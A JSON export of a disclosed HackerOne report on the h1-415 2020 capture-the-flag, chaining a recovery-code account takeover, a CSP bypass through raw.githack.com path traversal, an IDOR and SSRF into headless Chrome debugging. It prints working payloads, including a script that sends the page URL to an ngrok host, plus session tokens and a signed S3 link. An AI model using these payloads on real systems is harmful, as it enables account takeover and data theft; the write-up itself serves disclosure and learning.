{
  "id": 781295,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83ODEyOTU=",
  "url": "https://hackerone.com/reports/781295",
  "title": "[h1-415 2020] SSRF in a headless chrome with remote debugging leads to sensible information leak",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2020-01-23T06:37:43.199Z",
  "submitted_at": "2020-01-23T06:37:43.199Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "d1r3wolf",
    "url": "/d1r3wolf",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/v3k5gr6QFfVf4pGryaVXyw3p/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 46757,
    "url": "https://hackerone.com/h1-ctf",
    "handle": "h1-ctf",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "h1-ctf",
      "twitter_handle": "Hacker0x01",
      "website": "",
      "about": "Let's save the holidays together! #TogetherWeHitHarder"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-02-04T07:17:43.082Z",
  "bug_reporter_agreed_on_going_public_at": "2020-02-04T07:17:43.024Z",
  "team_member_agreed_on_going_public_at": "2020-02-03T20:34:51.549Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nConverter is using headless chrome with remote debbuging by rendring a page where we have out name, with which we can get xss leads to ssrf\nBy using the remote debbugging with that ssrf we can grab the info all tabs in that chrome wher we can get even the flag document.\n\n## Steps To Reproduce:\n\n  1. Using QR code generator (at recovery to) to take over account (jobert@mydocz.cosmic)\n  2. Using xss in support by bypassing the csp using the github account , simple by backtracking in the url\n  3. At the suport review, there is a idor we can change anyones name , with out character stripping (<>{}) . so we can change our name to tigger xss in pdf converter\n  4. in the pdf convertor, ssrf to access the remote debbugging to leak the info\n\n## Breif\n 1. Using QR code generator (at recovery to) to take over account (jobert@mydocz.cosmic)\n\n    While return a QR after registering it is stripping the <> chars , which help's to create recovery qr for anyones account.\nwe cant create a account with jobert@mydocz.cosmic mail\nbut we can create account with jobert@mydocz.cosmic<><> mail\nafter creates it returns the recover code by stripping <> means recovery code of jobert@mydocz.cosmic\n\n 2. Using xss in support by bypassing the csp using the github account , simple by backtracking in the url\n     \n     After getting jobert's account we can enter the support channel, where if we gave rating 1 , our chat we be reviewed. we have xss in messages but we need to bypass the csp.\n```Content-Security-Policy: default-src 'self'; object-src 'none'; script-src 'self' https://raw.githack.com/mattboldt/typed.js/master/lib/; img-src data: *```\ncsp is allowing the script from https://raw.githack.com/mattboldt/typed.js/master/lib/, here  we can backtrack any url upto its root(/) and github is a open source.\nSo we can include js file in our github account using backtracking,. csp bypassed : )\nThe message\n```html\n<script type=\"text/javascript\" src=\"https://raw.githack.com/mattboldt/typed.js/master/lib/typed.js/..%252f..%252f..%252f..%252f..%252fAjay-Aj-00/Test/master/final.js\"></script>\n```\njs file : \n```js\nwindow.location = \"https://8a7b2695.ngrok.io/record-data?name=path&data=\"+btoa(window.location.href)\n```\nas that support review link does need any login or localhost . so we can access it from outside. so grabbing that link.\n\n\n 3. At the suport review, there is a idor we can change anyones name , with out character stripping (<>{}) . so we can change our name to tigger xss in pdf converter\n   Support provies updating the user along with reviewsing chat\n   There is idor at updating user's name (with out sanitizing <> chars) which is used at convertor\n```\nPOST /support/review/efe74fb38a69eae74f733a3e035edf33ed14f34af0755495ff6abae219155587 HTTP/1.1\nHost: h1-415.h1ctf.com\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://h1-415.h1ctf.com/support/review/88cdddff2719525210a5cdc95f3cf7f14c83f6e44caf87f5ec4255a9f69e35eb\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 135\nOrigin: https://h1-415.h1ctf.com\nConnection: close\nCookie: _csrf_token=46cb8a62c3c99b5d5a2c045baecf9039216a3cee; session=eyJfY3NyZl90b2tlbiI6IjQ2Y2I4YTYyYzNjOTliNWQ1YTJjMDQ1YmFlY2Y5MDM5MjE2YTNjZWUifQ.Xikx5g.KDxEtKJxN1cDleoMbr6adoqpgCs\nUpgrade-Insecure-Requests: 1\n.\nname=<script src=\"https://8a7b2695.ngrok.io/static/js/new.js\"></script>&user_id=18&_csrf_token=46cb8a62c3c99b5d5a2c045baecf9039216a3cee\n```\n\n## Impact\n\nLeaking sensitive information ofusers.",
  "weakness": {
    "id": 68,
    "name": "Server-Side Request Forgery (SSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 693532,
      "file_name": "flag.pdf",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/sRu9S7WT4qyVhMtwA6NNxY11?response-content-disposition=attachment%3B%20filename%3D%22flag.pdf%22%3B%20filename%2A%3DUTF-8%27%27flag.pdf&response-content-type=application%2Fpdf&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5DNGZVVG%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T133607Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICHLJPsWBp5sr6QP325sn3QmpUNWJkG1Rn9WpoDeqIg3AiEAiF8%2BSn1jT5ntK2r0sSCmNUGX9ZemOesqgbKFIUBuyWMqsAUIdhADGgwwMTM2MTkyNzQ4NDkiDD5dvB5yVZqhTClUciqNBapM8w3AEMj9vUut8ipBYyxkUXmIzrvgZ28gnqyQ6mhhFeeoPRU%2FpSxAJl9%2BpYrNip4ItC3BkgYDlk9abNplTrvNVi9OhutOp4ZE1wWKJlPpOzKXUOBoUe%2FRWzdh9xwCJuGDbGkQ7ngPegxy3y6LCFP5wP6sjVHLhEaT7e6L88U08XjQmZEZxAGGE5IESnoSUeW4EvOXBp5DQcR1t39zozskg4dISh5C2Ff6jgUnjDu9sYdoZA7dJgdByDPIA4VjLFdTVEjklaMXr4YtD7wTmG9hWanDSlJ11qBRruTBFPloL6Kq2YKCTOj8wC0UP9ctvuxeNwV7QKFhmu8bB6csA5mvLVxUvoelFVuLgYYhtCHZDGPo54Dzbn5soqg%2FJjzSexzqrvBtELxoPLfeuC9o2KpP0lfY7eBpdmAqxwpFPSBaxPJ66SICOozWWbpDqIqnFrnvz%2BXEMOe5z7dsDsKieBfX52kLKmUuAGG9Tv0jWo8CMlR7jOkbaaLMpho6b6rMGTGHucZmDgIYIwvcdVrd1njiiPPNTxx6qoUNz0WdZUAlGWBtiCv4fABRuY7ZjWGOAD0PFPT8FsbFoQ6mkw28XZaoMR735I%2FMJlHvafhgKlPNFVKsVzF%2F3GpLM7ECVpPoLq9VNtYgjHnuZ0U6e4r9781nElHBM1WdTrWia%2F9%2FJIwTVLKAnxWWWscJrGFA8kraj4Xrc3KPePGa2suQ5Fim1jPzWeLA%2Bfr7aEab%2FJVFYU%2F%2BIs0KPZarsTUlG%2B656GYmZcf%2Fa2gbirYZQRBwlZlZahqG0l8iMLSK0TCfJOwBIAuJd7wWISVFGCV0aYj458Ker2Pjca9HvyzcI8qiuhyhF68QiOr9MFM67rM70ExPMPHFra4GOrEB58pDHOC4avlR6xYMRYlBCOP%2F5dyV6PT6gr9Vs5I8zhf3jjEkzka6Au6GNesJTj11PvvCjC1fFqxeJeAvkQZYn2pzivrXx7RBTeI6fAxztLLN3Lu9uyUpmO1SqciT2zDRX2wO0JTz6DtjgCLlfMq%2FHCRF8EoZi0alN2KMbAkJBqtFpznpmUaem89ejwzJcKJLTQiW1rXarR6VZiM7isz2KsMf5L4b0KstHgl%2Fux6s5iUg&X-Amz-SignedHeaders=host&X-Amz-Signature=017c9225ab875a07f5bc1075ee4a5a4e5fcaa9ce80813ddccc604dcdc9684568",
      "file_size": 60409,
      "type": "application/pdf",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2020-03-04T20:34:51.641Z",
  "allow_singular_disclosure_after": -124477276.15930983,
  "singular_disclosure_allowed": true,
  "vote_count": 10,
  "voters": [
    "nytr0gen",
    "checkm50",
    "0xacb",
    "nukedx",
    "d1r3wolf",
    "debarghyasahoo",
    "emnlx",
    "sakethreddy007",
    "hoacks",
    "arkinson"
  ],
  "severity": {
    "rating": "critical",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 42751,
    "asset_type": "URL",
    "asset_identifier": "h1-415.h1ctf.com",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
